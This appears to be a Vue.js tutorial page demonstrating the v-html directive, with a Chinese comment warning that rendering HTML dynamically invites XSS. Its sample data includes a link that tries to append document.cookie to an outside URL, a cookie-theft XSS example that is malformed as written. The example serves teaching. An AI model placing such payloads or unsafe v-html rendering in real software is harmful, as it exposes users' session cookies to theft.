<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Document</title>
  <script src='../js/vue.js'></script>
</head>

<body>
  <!-- 
    v-html指令: 
        1.作用: 向指定节点中渲染包含html结构的内容
        2.与{{}}的区别
          (1) v-html会替换节点中的所有内容,{{xxx}}不会
          (2) v-html可以识别html结构
        3.严重注意: v-html有安全性问题！！
          (1)在网站上动态渲染HTML是很危险的，容易导致XSS攻击
          (2)要在可信内容上使用v-html，不能用在用户提交上
   -->

  <div id="root">
    <div v-text='str'></div>
    <div v-html='str'></div>
    <div v-html='str2'></div>
  </div>
  <script>
    Vue.config.productionTip = false
    new Vue({
      el: '#root',
      data() {
        return {
          mag: '你好',
          str: '<h3>你好啊</h3>',
          str2: '<a href="http://www.baidu.com?"+document.cookie>点我一下</a>',
        }
      },
      methods: {
        down() {
          console.log(111);
        }
      }
    })
  </script>
</body>

</html>
